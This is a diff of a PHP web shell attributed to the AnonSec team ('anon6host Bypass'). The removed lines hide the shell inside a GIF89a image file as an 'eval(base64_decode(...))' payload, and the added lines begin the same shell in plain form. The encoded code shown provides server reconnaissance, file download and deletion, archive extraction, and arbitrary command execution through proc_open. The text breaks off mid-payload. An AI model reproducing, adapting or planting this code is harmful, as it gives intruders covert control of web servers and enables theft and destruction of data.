@@ -1,48 +1,607 @@
-GIF89a;=( �' 7IAXKgNgYvYx\%wh�h�t�h%�s%�x�}9����&��%��(��.��5��D��&ǚ)ǟ5ǘ;ͣ*ȡ&ղ)ׯ7׵<ѻ4�3�H֧KͯT�Y��q��q��F�                                                                           !�
- ' !�NETSCAPE2.0   ,    =(  �pH,�Ȥr�l:�ШtJ�Z�جv��z��xL.���z�n���|N����~��������������������������������������������g���E�����������E�����B�� ��ȸ��D�����Ů� �H��L��D٫D�B���>D���T���H �G�A R�ڐ
-|��٭&��E8���kG�A�px�a��� R2XB��E8I���6X�:vT)���q�賥�仕F~%x� �
-4#ZԉO|-4Bs��X:=
-Q� ��l��yXJ�GȦ|sh��K�3l7�B|�$'7Jީܪ����D�n=�P�����`䌨lj����v>�|5
-�.69�ϸd�����nlv����f{���Pb��l5���p�����3a���I�O���އ��Ƃ��i���#��)p� ޽	��{�)vm��%D~6f�s}Ń�D�W E�`��	��L8x����{)x`X/>�}m�Rؑ*|`D�=��_ ^�5!_�'a�Oڗ7�c��`D�Cx`�¥��Y��F����?���� �n@`�}	lď���@4>�d
-� �v�xN�י@�d��=�g�s�G���	���ud &p8Q�)��lXD����A�H�ySun�j���k*D�LH�]���C�J��Xb~ʪwSt�6K,��q��:9ت:���l�@�`���	�.۬�t��S�[:��=����N����{¿�A �Rې��6����0�_ �;������^���#���!�Ę�U���;0L1�u�p%A:U̬ݵ��%霼�����~`�G���� ���=4�np�3�������u�u�ٮ|%2�I��r�#0��J``8�@S@5����^`8E�]�.�����7 � ȉ�j ��D� z�i�������!���l��w�*�D�I�nEX���	&A�Go�Qf��F��;����J����F5��Q|���X��T��y���]� o ��C=����PB@ D׽��(>�C�x�`����JЀ�۠��p+eE0`�`A�/NE�؆�9�@���	H�7��%B�`�l*���8 2�%� ��:�1IE��ux%nP1�!��C)�P81l�ɸF#��{����B�0>��
-�b����O�3Ȗ�()yRpb��E.Z�D8�H@%�x+%٘�c� ���f�b�d�`F�8�XH"��-�|1�6iI, 2���$+](A*j�QT�o�.�U슬�ㄎ`�SN�����y�e�������b��o� �)�y�@��3	�tT̉�&�+�L�f"�-|����>��v�О�\�Q1)�@��h#aP72����$�  !�
- " ,    =( �7IAXG]KgNgYvYxR"k\%w]'}h�t�h%�g+�s%�r.�m3�x3�x�}9��&��+��7��%��(��.��D��&ǘ;͕&ײ)׻4��6�K�                                                                                          �@�pH,�Ȥr�l:�ШtJ�Z�جv��z��xL.���z�n���|N����~��������������������������������������������g �� E ��
-�������E
-�´���C���Ƕ���D�ÕƷ�ʱH��M��GڬD�B�}�D��T����G���C�C�	l&�:'�tU�6ɹ#��)�'�.6�&��ȻK(8p0N�?!�2"ۈNĲX>R��O�M	'��2�*��>#n��
-�@�<[:�I�f� ��T�˘Cdb�ٓ[��E�5MBo��@�`@���tW-3 ���B���jI݅E�9[T�$��ﯧ���s��ȳ����dc�UUρ#���ldj?�?`\����u|3'֌]�6 �S#���FKL�*N
-E����$��e�YD��q�.�촁�s \-�jA9�����-��M[�x(�s��x�|���p����k�T�DpE@W�	��]k�1� ���Yb �Il��*n0�癗�zBdОu�7ĉBl��-�x~|U�U�
-�h�*H��|��e"#"?vp�i�e6^��+q��m8  #V�� <F�C��^F9�#��RAGb�d�(0$k����'L�)B�]��e�>���V��|���m"с�n|@�U��Ξ��pb�G�ED�����2F�I�?
->�x�
-��
-���%��j��ꄯ<�a�9ĳ�2�D��&��Z`��]w���:�6��B�7eFJ|�ҧ�,���FǮcS�ʶ+B�,�ޘ�N���>PAD�HD�枫��n��}�#˒�
-Q��S���2�X�{�k�lQ�2���/w�|2�h���G�,m���3��6-��E�L��I�³*K���q�`DwV�QX���pe����	q��T�������u �<�a�*At�lmE�
-���N[P1�ۦ��$��@`��Dpy�yXvCAy�B`�D�	0QwG#�
-�[^��	$���Ǧ{�L��[��K�g�;�S~��GX.�goT.����������?1z�:�g�|�<O��!��{�E �{�V����C�{��go�����'��zEH�rJ�=�5���鲥���4��дV	w���$xVA.�+��'�E��E ^������84`K�>L��������0�]P�^p	F<"��?!,�N4��P� D��:T�@h%t��:�-��I<`��p I�.)^ 40D#p@�j4��؀:��1��r��F2oW�#Z�;$Q	q�
-� �K��Nl#29 !�F@�Bh�ᏀL!�XF�LH�Kh�.�hE&J�G��<�WN!���ڈY�@��>��19J"�2,/
-&.GXB%�R�9B6�W]����W��I�$��ӌE8Y�	����A5��Q.a�B�&ة�JW!	�t)K%t�-�JF
-b�NMxL��)�R�Й����6�O!TH̄H�	�   !�
- ) ,    =( �AXKgNgYvYxR"k\%wh�h�h%�g+�s%�r.�x3�x�}9��&��+��,��7��%��(��.��5��&ǚ)ǘ;͕&ף*Ȳ)ׯ7׻4�3��6�H֧KͻH�T�Y��q��h�                                                                     �pH,�Ȥr�l:�ШtJ�Z�جv��z��xL.���z�n���|N����~��������������������������������������������g ��
+<!-- Thanks to all member of AnonSec Team -->
+<!-- Recode ? Silahkan, tapi jangan lupa cantumkan nama author nya xixixi -->
+<!-- Anon7 - AnonsecTeam -->
+<!-- anon6host - https://anon6host.my.id
 
-E$�����
-�
-����$E$�Õ��D� � �����̌��C��� E��H�M��G�D��B��ϾD��a�
-1r��Ӑ��	�o��zU!L�C'�yW�UGt����ll�0���uG�)A�s[��x�
-�xO%��X2�
-
-P�n�R/�њH�e+�Dm?#��ǣ6�8�J���Di�M�ք�j����5oQ7�-
-<�
-*�l�ӌ2r/a!l)d� A��E���͆��;֘c �%߂�و�b���pe~C"B���H�eF2��8qb�t_`ur�e�
-w�u3��Pv�h�"�`�Íx�LĹ��3��~ֺ������MDfJ�
-��۵�W�%���੖�X �؁)�@�ћE��w�u�Sxb8y\mÖz���Zb�E��L��w!y(>��w�=�|��s�d�C�W)H�cC$�L �7�r.�\{)@�`@	�X�$PD� `�aG:��O�72E�amn]�"�c�xь� &dR8`g��iٟLR!�P
-�d�䡓���T���i�|�_
-� Qi�#��g����noM�
-�V
-�)p����W��=�e�k��j����1߲s�x�W�j�l|0��B0�, \j۴�6���C
-��W��|�ً���zĸV {�;��n��V�m�I��.��PN�
-�����C��+��By�ѾHŸ����
-7�Y�FTk�SaoaY$D�����29R�kt� ��f� ��:��Sp�3�I��DZ� �9���g��u�*3)O���[_hv,���Et��BH��[�64M@�S�M7d�l5-��U܍��zߌ3Ԁ3��� ��P�5�g�
-�ژkN�݅0�j4��밓#{��3S�2�K�'ợl��2K{� {۶?�m𸧠�I�nE�='����^���_�=���#O��'���o..�Y�n��C�O��a��K�o,���b����{�C�ڗ"��{�K ��w��Ozdը�:$ ���v�]	A#� �����z)Rx׿����d``�w-�y�f�K!����|��P���=�`�(f���'Pa
-��BJa%��f��%��}F����6>��G"��=�!o��^FP�ةQ��C�P`(��\�ݮ
-��$<��n@dĠE#��U�I�!� �#l��`k���'Rr��Z�NB�MF�[�+��Ɉ-�wj���8�r�
-,V�h�"�|��=�G_�љE� 0i*%̲��da0mV�k�)�;�&6p>�jK���#
-�D�:�c?:R	Ӭf��I-̓��<�=���7�3���c2�W	,��8(T�P�F¡Jh�"�  ;<?php eval("?>".base64_decode("PCEtLSBUaGFua3MgdG8gYWxsIG1lbWJlciBvZiBBbm9uU2VjIFRlYW0gLS0+DQo8IS0tIFJlY29kZSA/IFNpbGFoa2FuLCB0YXBpIGphbmdhbiBsdXBhIGNhbnR1bWthbiBuYW1hIGF1dGhvciBueWEgeGl4aXhpIC0tPg0KPCEtLSBBbm9uNyAtIEFub25zZWNUZWFtIC0tPg0KPCEtLSBhbm9uNmhvc3QgLSBodHRwczovL2Fub242aG9zdC5teS5pZA0KDQoNCg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgIDx0aXRsZT5hbm9uNmhvc3Q8L3RpdGxlPg0KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iQW5vbjciPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSIgLz4NCiAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0id2UgYXJlIHBhcnR5IGF0IHlvdXIgc2VjdXJpdHkgISI+DQogICAgPG1ldGEgcHJvcGVydHk9Im9nOmRlc2NyaXB0aW9uIiBjb250ZW50PSJ3ZSBhcmUgcGFydHkgYXQgeW91ciBzZWN1cml0eSAhIj4NCiAgICA8bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9Imh0dHBzOi8vaS5pbWd1ci5jb20vNlJTeXZvSi5qcGciPg0KICAgIDxtZXRhIG5hbWU9InJvYm90cyIgY29udGVudD0ibm9pbmRleCI+DQogICAgPG1ldGEgbmFtZT0iZ29vZ2xlYm90IiBjb250ZW50PSJub2luZGV4Ij4NCiAgICA8bWV0YSBuYW1lPSJ0aGVtZS1jb2xvciIgY29udGVudD0iIzFmMWYxZiI+DQo8L2hlYWQ+DQo8Ym9keSBiZ2NvbG9yPSIjMWYxZjFmIiB0ZXh0PSIjZmZmZmZmIj4NCjxsaW5rIGhyZWY9IiIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+DQo8bGluayBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNS4xMy4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4NCjxzdHlsZT4NCiAgICBAaW1wb3J0IHVybCgnaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PURvc2lzJyk7DQogICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1CdW5nZWUnKTsNCmJvZHkgew0KICAgIGZvbnQtZmFtaWx5OiAiRG9zaXMiLCBjdXJzaXZlOw0KICAgIHRleHQtc2hhZG93OjBweCAwcHggMXB4ICM3NTc1NzU7DQp9DQoNCmJvZHk6Oi13ZWJraXQtc2Nyb2xsYmFyIHsNCiAgd2lkdGg6IDEycHg7DQp9DQoNCmJvZHk6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsNCiAgYmFja2dyb3VuZDogIzFmMWYxZjsNCn0NCg0KYm9keTo6LXdlYmtpdC1zY3JvbGxiYXItdGh1bWIgew0KICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWYxZjFmOw0KICBib3JkZXI6IDNweCBzb2xpZCBncmF5Ow0KfQ0KDQojY29udGVudCB0cjpob3ZlciB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogIzYzNjI2MzsNCiAgICB0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZjsNCn0NCg0KI2NvbnRlbnQgLmZpcnN0IHsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjUzODNDOw0KfQ0KDQojY29udGVudCAuZmlyc3Q6aG92ZXIgew0KICAgIGJhY2tncm91bmQtY29sb3I6ICMyNTM4M0MNCiAgICB0ZXh0LXNoYWRvdzowcHggMHB4IDFweCAjNzU3NTc1Ow0KfQ0KDQp0YWJsZSB7DQogICAgYm9yZGVyOiAxcHggIzAwMDAwMCBkb3R0ZWQ7DQogICAgdGFibGUtbGF5b3V0OiBmaXhlZDsNCiAgICB3b3JkLWJyZWFrOiBicmVhay1hbGw7DQp9DQoNCnRleHRhcmVhIHsNCiAgICBtYXgtd2lkdGg6IDk1JTsNCiAgICBtYXgtaGVpZ2h0OiAxMDAlOw0KICAgIHJlc2l6ZTogbm9uZTsNCiAgICBvdXRsaW5lOiBub25lOw0KICAgIG92ZXJmbG93OiBhdXRvOw0KICAgIGJhY2tncm91bmQ6IHRyYW5zcGFyZW50Ow0KICAgIGNvbG9yOiAjZmZmOw0KfQ0KDQp0ZXh0YXJlYTo6LXdlYmtpdC1zY3JvbGxiYXIgew0KICB3aWR0aDogMTJweDsNCn0NCg0KdGV4dGFyZWE6Oi13ZWJraXQtc2Nyb2xsYmFyLXRyYWNrIHsNCiAgYmFja2dyb3VuZDogIzFmMWYxZjsNCn0NCg0KdGV4dGFyZWE6Oi13ZWJraXQtc2Nyb2xsYmFyLXRodW1iIHsNCiAgYmFja2dyb3VuZC1jb2xvcjogIzFmMWYxZjsNCiAgYm9yZGVyOiAzcHggc29saWQgZ3JheTsNCn0NCg0KYSB7DQogICAgY29sb3I6ICNmZmZmZmY7DQogICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KfQ0KDQphOmhvdmVyIHsNCiAgICBjb2xvcjogZ29sZDsNCiAgICB0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggI2ZmZmZmZjsNCn0NCg0KaW5wdXQsc2VsZWN0LHRleHRhcmVhIHsNCiAgICBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOw0KICAgIC1tb3otYm9yZGVyLXJhZGl1czogNXB4Ow0KICAgIC13ZWJraXQtYm9yZGVyLXJhZGl1czo1cHg7DQogICAgYm9yZGVyLXJhZGl1czo1cHg7DQp9DQoNCi5nYXMgew0KICAgIGJhY2tncm91bmQtY29sb3I6ICMxZjFmMWY7DQogICAgY29sb3I6ICNmZmZmZmY7DQogICAgY3Vyc29yOiBwb2ludGVyOw0KfQ0KDQpzZWxlY3Qgew0KICAgIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFyZW50Ow0KICAgIGNvbG9yOiAjZmZmZmZmOw0KfQ0KDQpzZWxlY3Q6YWZ0ZXIgew0KICAgIGN1cnNvcjogcG9pbnRlcjsNCn0NCg0KLmxpbmthIHsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICBjb2xvcjogI2ZmZmZmZjsNCn0NCg0KLnVwIHsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgICBjb2xvcjogI2ZmZjsNCn0NCg0Kb3B0aW9uIHsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMWYxZjFmOw0KfQ0KDQo6Oi13ZWJraXQtZmlsZS11cGxvYWQtYnV0dG9uIHsNCiAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7DQogIGNvbG9yOiAjZmZmOw0KICBib3JkZXItY29sb3I6ICNmZmY7DQogIGN1cnNvcjogcG9pbnRlcjsNCn0NCjwvc3R5bGU+DQo8c2NyaXB0Pg0KZnVuY3Rpb24gc2V0ZmlsZW5hbWUodmFsKQ0KICB7DQogICAgZmlsZW5hbWUgPSB2YWwuc3BsaXQoJ1xcJykucG9wKCkuc3BsaXQoJy8nKS5wb3AoKTsNCiAgICAvL2ZpbGVuYW1lID0gZmlsZW5hbWUuc3Vic3RyaW5nKDAsIGZpbGVuYW1lLmxhc3RJbmRleE9mKCcuJykpOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCduYW1hbnlhJykudmFsdWUgPSBmaWxlbmFtZTsNCiAgfQ0KDQphc3luYyBmdW5jdGlvbiBsb2FkRmlsZShmaWxlKSB7DQogICAgbGV0IHRleHQgPSBhd2FpdCBmaWxlLnRleHQoKTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYmVwYXNkYXRhIikuaW5uZXJIVE1MID0gdGV4dDsNCn0NCjwvc2NyaXB0Pg0KPGNlbnRlcj4NCjxmb250IGZhY2U9IkJ1bmdlZSIgc2l6ZT0iNSI+QW5vbjZob3N0IEJ5cGFzczxicj5odHRwczovL2Fub242aG9zdC5teS5pZjwvZm9udD48L2NlbnRlcj4NCjx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjEiIGFsaWduPSJjZW50ZXIiPg0KPHRyPjx0ZD4NCjw/cGhwDQovL0BzZXRfdGltZV9saW1pdCgwKTsNCi8vQGVycm9yX3JlcG9ydGluZygwKTsNCi8vQGh0dHBfcmVzcG9uc2VfY29kZSg0MDQpOw0KDQppbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDEpOw0KaW5pX3NldCgnZGlzcGxheV9zdGFydHVwX2Vycm9ycycsIDEpOw0KZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsNCg0KJGRpc2Z1bmMgPSBAaW5pX2dldCgiZGlzYWJsZV9mdW5jdGlvbnMiKTsNCmlmIChlbXB0eSgkZGlzZnVuYykpIHsNCiAgICAkZGlzZiA9ICI8Zm9udCBjb2xvcj0nZ29sZCc+Tk9ORTwvZm9udD4iOw0KfSBlbHNlIHsNCiAgICAkZGlzZiA9ICI8Zm9udCBjb2xvcj0ncmVkJz4iLiRkaXNmdW5jLiI8L2ZvbnQ+IjsNCn0NCg0KZnVuY3Rpb24gYXV0aG9yKCkgew0KICAgIGVjaG8gIjxjZW50ZXI+PGJyPkFub25TZWMgLSAyMDIxPC9jZW50ZXI+IjsNCiAgICBleGl0KCk7DQp9DQoNCmZ1bmN0aW9uIGNla2RpcigpIHsNCiAgICBpZiAoaXNzZXQoJF9HRVRbJ3BhdGgnXSkpIHsNCiAgICAgICAgJGxva2FzaSA9ICRfR0VUWydwYXRoJ107DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGxva2FzaSA9IGdldGN3ZCgpOw0KICAgIH0NCiAgICBpZiAoaXNfd3JpdGFibGUoJGxva2FzaSkpIHsNCiAgICAgICAgcmV0dXJuICI8Zm9udCBjb2xvcj0nZ3JlZW4nPldyaXRlYWJsZTwvZm9udD4iOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybiAiPGZvbnQgY29sb3I9J3JlZCc+V3JpdGVhYmxlPC9mb250PiI7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBjZWtyb290KCkgew0KICAgIGlmIChpc193cml0YWJsZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKSkgew0KICAgICAgICByZXR1cm4gIjxmb250IGNvbG9yPSdncmVlbic+V3JpdGVhYmxlPC9mb250PiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICI8Zm9udCBjb2xvcj0ncmVkJz5Xcml0ZWFibGU8L2ZvbnQ+IjsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIHhybWRpcigkZGlyKSB7DQogICAgJGl0ZW1zID0gc2NhbmRpcigkZGlyKTsNCiAgICBmb3JlYWNoICgkaXRlbXMgYXMgJGl0ZW0pIHsNCiAgICAgICAgaWYgKCRpdGVtID09PSAnLicgfHwgJGl0ZW0gPT09ICcuLicpIHsNCiAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICB9DQogICAgICAgICRwYXRoID0gJGRpci4nLycuJGl0ZW07DQogICAgICAgIGlmIChpc19kaXIoJHBhdGgpKSB7DQogICAgICAgICAgICB4cm1kaXIoJHBhdGgpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgdW5saW5rKCRwYXRoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBybWRpcigkZGlyKTsNCn0NCg0KZnVuY3Rpb24gZHVubHV0KCRmaWxlKSB7DQogICAgaWYgKCFpc19yZWFkYWJsZSgkZmlsZSkpIHsNCiAgICAgICAgcmVkKCJDYW5ub3QgRG93bmxvYWQgRmlsZSAvIFVucmVhZGFibGUgRmlsZSAhIik7DQogICAgICAgIGRpZSgpOw0KICAgIH0NCiAgICBoZWFkZXIoJ0NvbnRlbnQtRGVzY3JpcHRpb246IEZpbGUgVHJhbnNmZXInKTsNCiAgICBoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyk7DQogICAgaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0iJy5iYXNlbmFtZSgkZmlsZSkuJyInKTsNCiAgICBoZWFkZXIoJ0V4cGlyZXM6IDAnKTsNCiAgICBoZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IG11c3QtcmV2YWxpZGF0ZScpOw0KICAgIGhlYWRlcignUHJhZ21hOiBwdWJsaWMnKTsNCiAgICBoZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoOiAnIC4gZmlsZXNpemUoJGZpbGVwYXRoKSk7DQogICAgZmx1c2goKTsNCiAgICByZWFkZmlsZSgkZmlsZSk7DQogICAgZGllKCk7DQp9DQoNCmZ1bmN0aW9uIG93bmVyKCRmaWxlKSB7DQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0cHd1aWQiKSkgew0KICAgICAgICAkdG9kID0gQHBvc2l4X2dldHB3dWlkKGZpbGVvd25lcigkZmlsZSkpOw0KICAgICAgICByZXR1cm4gIjxjZW50ZXI+Ii4kdG9kWyduYW1lJ10uIjwvY2VudGVyPiI7DQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICI8Y2VudGVyPiIuZmlsZW93bmVyKCRmaWxlKS4iPC9jZW50ZXI+IjsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGNla3dyaXRlKCRsb2thc2kpIHsNCiAgICAkaXppbiA9IHN1YnN0cihzcHJpbnRmKCclbycsIGZpbGVwZXJtcygkbG9rYXNpKSksIC00KTsNCiAgICBpZiAoaXNfd3JpdGFibGUoJGxva2FzaSkpIHsNCiAgICAgICAgcmV0dXJuICI8Zm9udCBjb2xvcj1ncmVlbj4iLiRpemluLiI8L2ZvbnQ+IjsNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4gIjxmb250IGNvbG9yPXJlZD4iLiRpemluLiI8L2ZvbnQ+IjsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGVrc2UoJGtvbWVuZCwgJGxva2FzaSkgew0KICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCJwcm9jX29wZW4iKSkgew0KICAgICAgICBkaWUoInByb2Nfb3BlbiBmdW5jdGlvbiBkaXNhYmxlZCAhIik7DQogICAgfSBlbHNlaWYgKCFmdW5jdGlvbl9leGlzdHMoImJhc2U2NF9kZWNvZGUiKSkgew0KICAgICAgICBkaWUoImJhc2U2NF9kZWNvZGUgZnVuY3Rpb24gZGlzYWJsZWQgISIpOw0KICAgIH0NCiAgICAka29tZW4gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgka29tZW5kKSkpOw0KICAgIGlmIChzdHJwb3MoJGtvbWVuZCwgIjI+JjEiKSA9PT0gZmFsc2UpIHsNCiAgICAgICAgJGtvbWVuID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJGtvbWVuZCkpKS4iIDI+JjEiOw0KICAgIH0NCiAgICAkdG9kID0gQHByb2Nfb3Blbigka29tZW4sIGFycmF5KDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLCAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgMiA9PiBhcnJheSgicGlwZSIsICJyIikpLCAkcGlwZXMsICRsb2thc2kpOw0KICAgIGVjaG8gIjx0ZXh0YXJlYSByb3dzPScyNScgY29scz0nMTAwJz4iLmh0bWxzcGVjaWFsY2hhcnMoc3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pKS4iPC90ZXh0YXJlYT48YnI+PGJyPiI7DQp9DQoNCmZ1bmN0aW9uIGlwc2VydigpIHsNCiAgICBpZiAoZW1wdHkoJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ10pKSB7DQogICAgICAgIHJldHVybiBnZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKTsNCiAgICAgICAgaWYgKGVtcHR5KGdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pKSkgew0KICAgICAgICAgICAgcmV0dXJuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICRfU0VSVkVSWydTRVJWRVJfQUREUiddOw0KICAgIH0NCn0NCg0KZnVuY3Rpb24gY2VrZmlsZSgkZmlsZSkgew0KICAgICByZXR1cm4gJzxpIGNsYXNzPSJmYSBmYS1maWxlIiBzdHlsZT0iY29sb3I6ICNkNmQ0Y2UiPjwvaT4gJzsNCn0NCg0KZnVuY3Rpb24gZmlsZWRhdGUoJGZpbGUpIHsNCiAgICByZXR1cm4gZGF0ZSgiRiBkIFkgZzppOnMiLCBmaWxlbXRpbWUoJGZpbGUpKTsNCn0NCg0KZnVuY3Rpb24gdW56aXAoJGZpbGUsICRsb2thc2kpIHsNCiAgICBpZiAoIWlzX3JlYWRhYmxlKCRmaWxlKSkgew0KICAgICAgICByZWQoIkNhbm5vdCBVbnppcCBGaWxlIC8gVW5yZWFkYWJsZSBGaWxlICEiKTsNCiAgICAgICAgZGllKCk7DQogICAgfSBlbHNlaWYgKHN0cnBvcyhmaWxlX2dldF9jb250ZW50cygkZmlsZSksICJceDUwXHg0Ylx4MDNceDA0IikgPT09IGZhbHNlKSB7DQogICAgICAgIHJlZCgiVGhpcyBpc24ndCBaaXAgRmlsZSAhIik7DQogICAgICAgIGRpZSgpOw0KICAgIH0NCiAgICAkemlwID0gbmV3IFppcEFyY2hpdmU7DQogICAgJHJlcyA9ICR6aXAgLT4gb3BlbigkZmlsZSk7DQogICAgaWYgKCRyZXMgPT0gdHJ1ZSkgew0KICAgICAgICAkemlwIC0+IGV4dHJhY3RUbygkbG9rYXNpKTsNCiAgICAgICAgJHppcCAtPiBjbG9zZSgpOw0KICAgICAgICBncmVlbigiU3VjY2VzcyBVbnppcCBGaWxlICEiKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICByZWQoIkZhaWxlZCB0byBVbnppcCBGaWxlICEiKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGdyZWVuKCR0ZXh0KSB7DQogICAgZWNobyAiPGNlbnRlcj48Zm9udCBjb2xvcj0nZ3JlZW4nPiIuJHRleHQuIjwvY2VudGVyPjwvZm9udD4iOw0KfQ0KDQpmdW5jdGlvbiByZWQoJHRleHQpIHsNCiAgICBlY2hvICI8Y2VudGVyPjxmb250IGNvbG9yPSdyZWQnPiIuJHRleHQuIjwvY2VudGVyPjwvZm9udD4iOw0KfQ0KDQplY2hvICJTZXJ2ZXIgSVAgOiA8Zm9udCBjb2xvcj1nb2xkPiIuaXBzZXJ2KCkuIjwvZm9udD4gJm5ic3A7LyZuYnNwOyBZb3VyIElQIDogPGZvbnQgY29sb3I9Z29sZD4iLiRfU0VSVkVSWydSRU1PVEVfQUREUiddLiI8L2ZvbnQ+PGJyPiI7DQplY2hvICJXZWIgU2VydmVyIDogPGZvbnQgY29sb3I9J2dvbGQnPiIuJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddLiI8L2ZvbnQ+PGJyPiI7DQplY2hvICJTeXN0ZW0gOiA8Zm9udCBjb2xvcj0nZ29sZCc+Ii5waHBfdW5hbWUoKS4iPC9mb250Pjxicj4iOw0KZWNobyAiVXNlciA6IDxmb250IGNvbG9yPSdnb2xkJz4iLkBnZXRfY3VycmVudF91c2VyKCkuIiZuYnNwOzwvZm9udD4oIDxmb250IGNvbG9yPSdnb2xkJz4iLkBnZXRteXVpZCgpLiI8L2ZvbnQ+KTxicj4iOw0KZWNobyAiUEhQIFZlcnNpb24gOiA8Zm9udCBjb2xvcj0nZ29sZCc+Ii5AcGhwdmVyc2lvbigpLiI8L2ZvbnQ+PGJyPiI7DQplY2hvICJEaXNhYmxlIEZ1bmN0aW9uIDogIi4kZGlzZi4iPC9mb250Pjxicj4iOw0KZWNobyAiTXlTUUwgOiAiOw0KaWYgKGZ1bmN0aW9uX2V4aXN0cygibXlzcWxfY29ubmVjdCIpKSB7DQogICAgZWNobyAiPGZvbnQgY29sb3I9Z3JlZW4+T048L2ZvbnQ+IjsNCn0gZWxzZSB7DQogICAgZWNobyAiPGZvbnQgY29sb3I9cmVkPk9GRjwvZm9udD4iOw0KfQ0KZWNobyAiICZuYnNwO3wmbmJzcDsgY1VSTCA6ICI7DQppZiAoZnVuY3Rpb25fZXhpc3RzKCJjdXJsX2luaXQiKSkgew0KICAgIGVjaG8gIjxmb250IGNvbG9yPWdyZWVuPk9OPC9mb250PiI7DQp9IGVsc2Ugew0KICAgIGVjaG8gIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+IjsNCn0NCmVjaG8gIiAmbmJzcDt8Jm5ic3A7IFdHRVQgOiAiOw0KaWYgKGZpbGVfZXhpc3RzKCIvdXNyL2Jpbi93Z2V0IikpIHsNCiAgICBlY2hvICI8Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD4iOw0KfSBlbHNlIHsNCiAgICBlY2hvICI8Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PiI7DQp9DQplY2hvICIgJm5ic3A7fCZuYnNwOyBQZXJsIDogIjsNCmlmIChmaWxlX2V4aXN0cygiL3Vzci9iaW4vcGVybCIpKSB7DQogICAgZWNobyAiPGZvbnQgY29sb3I9Z3JlZW4+T048L2ZvbnQ+IjsNCn0gZWxzZSB7DQogICAgZWNobyAiPGZvbnQgY29sb3I9cmVkPk9GRjwvZm9udD4iOw0KfQ0KZWNobyAiICZuYnNwO3wmbmJzcDsgUHl0aG9uIDogIjsNCmlmIChmaWxlX2V4aXN0cygiL3Vzci9iaW4vcHl0aG9uMiIpKSB7DQogICAgZWNobyAiPGZvbnQgY29sb3I9Z3JlZW4+T048L2ZvbnQ+IjsNCn0gZWxzZSB